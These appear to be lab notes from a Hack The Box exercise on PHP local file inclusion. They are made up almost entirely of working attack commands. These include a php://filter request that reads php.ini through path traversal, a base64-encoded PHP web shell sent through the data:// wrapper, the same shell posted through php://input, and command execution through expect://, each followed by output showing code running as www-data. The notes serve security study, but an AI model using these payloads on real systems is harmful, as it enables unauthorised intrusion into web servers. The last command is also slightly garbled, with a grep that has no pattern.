## Data
#### Checking PHP Configurations

```shell
3kjS@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
![](Screenshot%202026-06-30%20at%2015.23.20.png)

```shell
3kjS@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
#### Remote Code Execution

```shell
3kjS@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
![](Pasted%20image%2020260630152440.png)

```shell
3kjS@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

		uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Input

```shell
3kjS@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

		uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Expect

```shell
3kjS@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

```shell
3kjS@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep 

		uid uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
